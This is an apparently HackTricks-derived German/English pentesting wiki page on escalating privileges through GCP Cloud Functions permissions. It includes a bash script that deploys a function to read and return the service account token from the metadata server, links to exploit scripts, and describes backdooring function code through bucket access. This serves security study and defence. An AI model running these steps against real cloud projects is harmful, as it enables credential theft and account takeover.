# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Mehr Informationen über Cloud Functions:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Ein Angreifer mit diesen Berechtigungen kann **eine neue Cloud Function mit beliebigem (bösartigem) Code erstellen und ihr ein Service Account zuweisen**. Dann, leak the Service Account token from the metadata to escalate privileges to it.\
Es könnten zusätzliche Berechtigungen erforderlich sein, um die Function auszulösen.

Exploit-Skripte für diese Methode finden Sie [hier](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) und [hier](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) und die vorgefertigte .zip-Datei finden Sie [hier](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Ein Angreifer mit diesen Berechtigungen kann **den Code einer Function ändern und sogar das angehängte Service Account modifizieren** with the goal of exfiltrating the token.

> [!CAUTION]
> Um Cloud Functions zu deployen benötigen Sie außerdem actAs-Berechtigungen für das default compute service account oder für das Service Account, das zum Erstellen des Images verwendet wird.

Es könnten zusätzliche Berechtigungen erforderlich sein, wie z.B. die `.call`-Permission für Version 1 cloudfunctions oder die Rolle `role/run.invoker`, um die Function auszulösen.

<details><summary>Update Cloud Function with malicious code to exfiltrate service account token</summary>
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
</details>

> [!CAUTION]
> Wenn Sie den Fehler `Permission 'run.services.setIamPolicy' denied on resource...` erhalten, liegt das daran, dass Sie den Parameter `--allow-unauthenticated` verwenden und nicht über ausreichend Berechtigungen dafür verfügen.

The exploit script for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

With this permission you can get a **signierte URL erhalten, um eine Datei in einen Function-Bucket hochzuladen (der Code der Funktion wird dadurch allerdings nicht geändert — Sie müssen ihn weiterhin aktualisieren)**

<details><summary>Signierte Upload-URL für Cloud Function erzeugen</summary>
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
</details>

Nicht sicher, wie nützlich nur diese Berechtigung aus der Perspektive eines Angreifers ist, aber gut zu wissen.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Gib dir selbst eine der vorherigen **`.update`** oder **`.create`**-Privilegien, um zu eskalieren.

### `cloudfunctions.functions.update`

Wenn du nur **`cloudfunctions`**-Berechtigungen hast, ohne **`iam.serviceAccounts.actAs`**, wirst du **die Funktion nicht aktualisieren können — DAS IST KEIN GÜLTIGER PRIVESC.**

### Read & Write Access over the bucket

Wenn du Lese- und Schreibzugriff auf den Bucket hast, kannst du Änderungen im Code überwachen und immer wenn ein **Update im Bucket stattfindet, kannst du den neuen Code durch deinen eigenen ersetzen**, sodass die neue Version der Cloud Function mit dem eingeschleusten Backdoor-Code ausgeführt wird.

Du kannst mehr über den Angriff lesen in:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Allerdings kannst du dies nicht verwenden, um Cloud Functions Dritter vorab zu kompromittieren, denn wenn du den Bucket in deinem Account erstellst und ihn öffentlich berechtigst, damit das externe Projekt darauf schreiben kann, erhältst du den folgenden Fehler:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> Dies könnte jedoch für DoS-Angriffe missbraucht werden.

### Read & Write Access over Artifact Registry

Wenn eine Cloud Function erstellt wird, wird ein neues docker image in die Artifact Registry des Projekts gepusht. Ich habe versucht, das Image durch ein neues zu ersetzen und sogar das aktuelle Image (und das `cache` image) zu löschen, aber es änderte sich nichts — die Cloud Function lief weiter. Daher könnte es vielleicht möglich sein, einen Race Condition-Angriff ähnlich wie beim Bucket zu missbrauchen, um den auszuführenden Docker-Container zu ändern, aber allein durch das Modifizieren des gespeicherten Images ist es nicht möglich, die Cloud Function zu kompromittieren.

## References

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
